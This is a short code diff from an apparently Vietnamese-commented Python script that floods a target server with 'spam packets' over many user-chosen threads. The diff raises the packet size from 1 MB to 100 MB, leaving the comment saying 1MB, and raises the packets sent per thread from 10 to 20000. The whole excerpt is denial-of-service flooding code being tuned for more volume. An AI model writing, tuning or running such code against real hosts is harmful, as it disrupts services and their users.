@@ -26,10 +26,10 @@ server_ip, server_port = server_address.split(":")
 server_port = int(server_port)  # Chuyển cổng sang số nguyên
 
 # Tạo gói tin spam 1MB
-packet = b"\x00" * (1024 * 1024)  # Một gói tin 1MB
+packet = b"\x00" * (100 * 1024 * 1024)  # Một gói tin 1MB
 
 # Mỗi luồng gửi 10 gói tin
-packet_count = 10
+packet_count = 20000
 
 # Số luồng muốn sử dụng
 thread_count = int(input("Nhập số lượng luồng: "))
